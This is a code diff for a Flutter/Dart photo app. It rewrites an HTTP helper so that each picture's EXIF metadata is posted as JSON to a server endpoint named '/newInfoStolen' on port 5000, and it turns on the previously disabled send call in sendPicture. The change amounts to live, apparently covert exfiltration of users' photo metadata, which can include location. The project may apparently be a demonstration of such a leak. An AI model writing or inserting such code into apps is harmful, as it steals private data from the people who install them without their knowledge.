@@ -1,7 +1,9 @@
+import 'dart:convert';
+import 'dart:io';
+
 import 'package:flutter/cupertino.dart';
 import 'dart:async';
 import 'package:flutter/material.dart';
-import 'package:http/http.dart' as http;
 import 'pictures.dart';
 
 class Post {
@@ -12,41 +14,44 @@ class Post {
 
   factory Post.fromJson(Map<String, dynamic> json) {
     return Post(
-      userId: json['userId'],
-      exifInfos: Map.from(json)..removeWhere((k, v) => k != 'userId')
+        userId: json['userId'],
+        exifInfos: json['exifInfos'],
     );
   }
 
   Map toMap() {
     var map = new Map<String, dynamic>();
     map["userId"] = userId;
-    for(String key in exifInfos.keys){
-      map[key] = exifInfos[key];
-    }
+    map["exifInfos"] = exifInfos;
     return map;
   }
 }
 
-class HttpRequestManager{
+class HttpRequestManager {
   static String _url;
+  static final int _port = 5000;
+  static final String _path = "/newInfoStolen";
 
-  static setUrl(String url){
-    _url = url;
+  static setUrl(String baseUrl) {
+    _url = baseUrl;
   }
 
-  static Future<bool> createPost({Map body}) async {
-    return http.post(_url, body: body).then((http.Response response) {
-      final int statusCode = response.statusCode;
-      if (statusCode < 200 || statusCode > 400 ) { // || json == null
-        return false; //throw new Exception("Error while fetching data");
-      }
-      return true;
-    });
+  static Future<bool> createPost(String url,int lPort,String lPath, {Map body}) async {
+    HttpClientRequest request = await HttpClient().post(url, lPort, lPath)
+      ..headers.contentType = ContentType.json
+      ..write(jsonEncode(body));
+    HttpClientResponse response = await request.close();
+    final int statusCode = response.statusCode;
+    if (statusCode < 200 || statusCode > 400) {
+      // || json == null
+      return false; //throw new Exception("Error while fetching data");
+    }
+    return true;
   }
 
   static Future<void> sendPicture(Picture picture) async {
-    Post newPost = Post(userId:"testUser",exifInfos:picture.exifInfos);
+    Post newPost = Post(userId: "DumbAssUser", exifInfos: picture.exifInfos);
     print(newPost.exifInfos);
-    //createPost(body: newPost.toMap());
+    await createPost(_url,_port,_path, body: newPost.toMap());
   }
 }
